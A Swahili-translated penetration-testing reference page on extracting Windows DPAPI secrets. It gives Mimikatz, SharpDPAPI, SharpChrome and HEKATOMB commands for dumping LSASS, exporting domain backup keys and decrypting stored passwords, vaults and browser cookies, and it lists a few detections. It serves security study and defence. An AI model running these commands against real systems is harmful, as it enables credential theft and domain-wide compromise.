# DPAPI - Kutolewa kwa Nywila

{{#include ../../banners/hacktricks-training.md}}



## DPAPI ni Nini

Data Protection API (DPAPI) inatumika hasa ndani ya mfumo wa uendeshaji wa Windows kwa **symmetric encryption ya funguo za binafsi zisizo sawa**, ikitumia siri za mtumiaji au mfumo kama chanzo muhimu cha entropy. Njia hii inarahisisha usimbaji kwa waendelezaji kwa kuwapa uwezo wa kusimbisha data kwa kutumia funguo zinazotokana na siri za kuingia za mtumiaji au, kwa usimbaji wa mfumo, siri za uthibitishaji wa kikoa cha mfumo, hivyo kuondoa hitaji kwa waendelezaji kusimamia ulinzi wa funguo za usimbaji wenyewe.

Njia ya kawaida zaidi ya kutumia DPAPI ni kupitia **`CryptProtectData` na `CryptUnprotectData`** kazi, ambazo zinawawezesha programu kusimbisha na kufungua data kwa usalama na kikao cha mchakato ambacho kwa sasa kimeingia. Hii ina maana kwamba data iliyosimbishwa inaweza kufunguliwa tu na mtumiaji au mfumo sawa na ule uliosimbisha.

Zaidi ya hayo, kazi hizi pia zinakubali **`entropy` parameter** ambayo pia itatumika wakati wa usimbaji na ufunguzi, hivyo, ili kufungua kitu kilichosimbishwa kwa kutumia parameter hii, lazima utoe thamani sawa ya entropy ambayo ilitumika wakati wa usimbaji.

### Uundaji wa funguo za Watumiaji

DPAPI inaunda funguo ya kipekee (inayoitwa **`pre-key`**) kwa kila mtumiaji kulingana na akidi zao. Funguo hii inatokana na nenosiri la mtumiaji na mambo mengine na algorithimu inategemea aina ya mtumiaji lakini inamalizika kuwa SHA1. Kwa mfano, kwa watumiaji wa kikoa, **inategemea HTLM hash ya mtumiaji**.

Hii ni ya kuvutia hasa kwa sababu ikiwa mshambuliaji anaweza kupata hash ya nenosiri la mtumiaji, wanaweza:

- **Kufungua data yoyote iliyosimbishwa kwa kutumia DPAPI** kwa funguo ya mtumiaji huyo bila kuhitaji kuwasiliana na API yoyote
- Jaribu **kufungua nenosiri** bila mtandaoni wakijaribu kuunda funguo halali ya DPAPI

Zaidi ya hayo, kila wakati data fulani inaposimbishwa na mtumiaji kwa kutumia DPAPI, funguo mpya ya **master key** inaundwa. Funguo hii ya master ndiyo inayotumika kwa kweli kusimbisha data. Kila funguo ya master inatolewa na **GUID** (Globally Unique Identifier) inayoiainisha.

Funguo za master zinahifadhiwa katika **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory, ambapo `{SID}` ni Kitambulisho cha Usalama wa mtumiaji huyo. Funguo ya master inahifadhiwa ikiwa imefungwa na **`pre-key`** ya mtumiaji na pia na **funguo ya akiba ya kikoa** kwa ajili ya urejeleaji (hivyo funguo hiyo hiyo inahifadhiwa ikiwa imefungwa mara 2 na nywila 2 tofauti).

Kumbuka kwamba **funguo ya kikoa inayotumika kusimbisha funguo ya master iko kwenye wasimamizi wa kikoa na haitabadilika kamwe**, hivyo ikiwa mshambuliaji ana ufikiaji wa msimamizi wa kikoa, wanaweza kupata funguo ya akiba ya kikoa na kufungua funguo za master za watumiaji wote katika kikoa.

Blobs zilizofungwa zina **GUID ya funguo ya master** ambayo ilitumika kusimbisha data ndani ya vichwa vyake.

> [!NOTE]
> Blobs zilizofungwa za DPAPI huanza na **`01 00 00 00`**

Pata funguo za master:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Hii ndiyo inavyoonekana kwa funguo nyingi za Mwalimu wa mtumiaji:

![](<../../images/image (1121).png>)

### Uundaji wa funguo za Mashine/System

Hii ni funguo inayotumika kwa mashine kuandika data. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni funguo maalum ambayo ni ya mtumiaji wa SYSTEM pekee anayeweza kuipata. Funguo hii inatumika kuandika data ambayo inahitaji kupatikana na mfumo wenyewe, kama vile akreditivu za kiwango cha mashine au siri za mfumo mzima.

Kumbuka kwamba funguo hizi **hazina nakala ya eneo** hivyo zinapatikana tu kwa ndani:

- **Mimikatz** inaweza kuipata kwa kutupa siri za LSA kwa kutumia amri: `mimikatz lsadump::secrets`
- Siri inahifadhiwa ndani ya rejista, hivyo msimamizi anaweza **kubadilisha ruhusa za DACL ili kuipata**. Njia ya rejista ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`

### Data Iliohifadhiwa na DPAPI

Kati ya data binafsi iliyo hifadhiwa na DPAPI ni:

- Windows creds
- Nywila za Internet Explorer na Google Chrome na data ya kukamilisha kiotomatiki
- Nywila za barua pepe na akaunti za FTP za ndani kwa programu kama Outlook na Windows Mail
- Nywila za folda za pamoja, rasilimali, mitandao isiyo na waya, na Windows Vault, ikiwa ni pamoja na funguo za usimbaji
- Nywila za muunganisho wa desktop ya mbali, .NET Passport, na funguo za kibinafsi kwa madhumuni mbalimbali ya usimbaji na uthibitishaji
- Nywila za mtandao zinazodhibitiwa na Meneja wa Akreditivu na data binafsi katika programu zinazotumia CryptProtectData, kama Skype, MSN messenger, na zaidi
- Blobs zilizohifadhiwa ndani ya rejista
- ...

Data iliyo hifadhiwa na mfumo inajumuisha:
- Nywila za Wifi
- Nywila za kazi zilizopangwa
- ...

### Chaguzi za kutoa funguo za Mwalimu

- Ikiwa mtumiaji ana ruhusa za admin wa eneo, wanaweza kupata **funguo ya nakala ya eneo** ili kufungua funguo zote za Mwalimu wa mtumiaji katika eneo:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Kwa ruhusa za usimamizi wa ndani, inawezekana **kufikia kumbukumbu ya LSASS** ili kutoa funguo kuu za DPAPI za watumiaji wote waliounganishwa na funguo ya SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ikiwa mtumiaji ana haki za usimamizi wa ndani, wanaweza kufikia **DPAPI_SYSTEM LSA siri** ili kufungua funguo kuu za mashine:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ikiwa nenosiri au hash NTLM ya mtumiaji inajulikana, unaweza **kufungua funguo kuu za mtumiaji moja kwa moja**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ikiwa uko ndani ya kikao kama mtumiaji, inawezekana kuomba DC kwa **funguo za akiba za kufungua funguo kuu kwa kutumia RPC**. Ikiwa wewe ni msimamizi wa ndani na mtumiaji amejiunga, unaweza **kuiba tokeni yake ya kikao** kwa hili:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Orodha ya Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Access DPAPI Encrypted Data

### Find DPAPI Encrypted data

Watumiaji wa kawaida **faili zilizolindwa** ziko katika:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Angalia pia kubadilisha `\Roaming\` kuwa `\Local\` katika njia zilizo hapo juu.

Mifano ya kuorodhesha:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kupata DPAPI iliyosimbwa blobs katika mfumo wa faili, rejista na B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka kwenye repo hiyo hiyo) inaweza kutumika kufungua data nyeti kama vile vidakuzi kwa kutumia DPAPI.

### Funguo za ufikiaji na data

- **Tumia SharpDPAPI** kupata akidi kutoka kwa faili zilizofichwa na DPAPI kutoka kwa kikao cha sasa:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pata taarifa za akidi** kama vile data iliyosimbwa na guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Fikia masterkeys**:

Fungua masterkey ya mtumiaji anayeomba **domain backup key** kwa kutumia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Chombo cha **SharpDPAPI** pia kinaunga mkono hoja hizi za ufichuzi wa masterkey (zingatia jinsi inavyowezekana kutumia `/rpc` kupata funguo za akiba za maeneo, `/password` kutumia nenosiri la maandiko, au `/pvk` kubainisha faili ya funguo binafsi ya DPAPI...).
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Fungua data kwa kutumia funguo kuu**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Chombo cha **SharpDPAPI** pia kinaunga mkono hoja hizi za `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (zingatia jinsi inavyowezekana kutumia `/rpc` kupata funguo za akiba za maeneo, `/password` kutumia nenosiri la maandiko, `/pvk` kubainisha faili ya funguo binafsi ya DPAPI, `/unprotect` kutumia kikao cha watumiaji wa sasa...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Fanya ufichuzi wa data fulani ukitumia **kipindi cha mtumiaji wa sasa**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
### Access other machine data

Katika **SharpDPAPI na SharpChrome** unaweza kuashiria chaguo la **`/server:HOST`** ili kufikia data ya mashine ya mbali. Bila shaka unahitaji kuwa na uwezo wa kufikia mashine hiyo na katika mfano ufuatao inatarajiwa kuwa **ufunguo wa usimbaji wa nakala ya eneo unajulikana**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Other tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni chombo kinachotumia otomatiki kutoa watumiaji wote na kompyuta kutoka kwenye directory ya LDAP na kutoa funguo za akiba za kudhibiti eneo kupitia RPC. Skripti itatatua anwani za IP za kompyuta zote na kufanya smbclient kwenye kompyuta zote ili kupata DPAPI blobs za watumiaji wote na kufungua kila kitu kwa kutumia funguo za akiba za eneo.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa orodha ya kompyuta zilizotolewa kutoka LDAP unaweza kupata kila sub network hata kama hukujua!

### DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kutoa siri zilizolindwa na DPAPI kiotomatiki.

### Common detections

- Ufikiaji wa faili katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na directories nyingine zinazohusiana na DPAPI.
- Haswa kutoka kwenye sehemu ya mtandao kama C$ au ADMIN$.
- Matumizi ya Mimikatz kufikia kumbukumbu ya LSASS.
- Tukio **4662**: Operesheni ilifanyika kwenye kitu.
- Tukio hili linaweza kuangaliwa ili kuona kama kitu cha `BCKUPKEY` kilifikiriwa.

## References

- [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

{{#include ../../banners/hacktricks-training.md}}
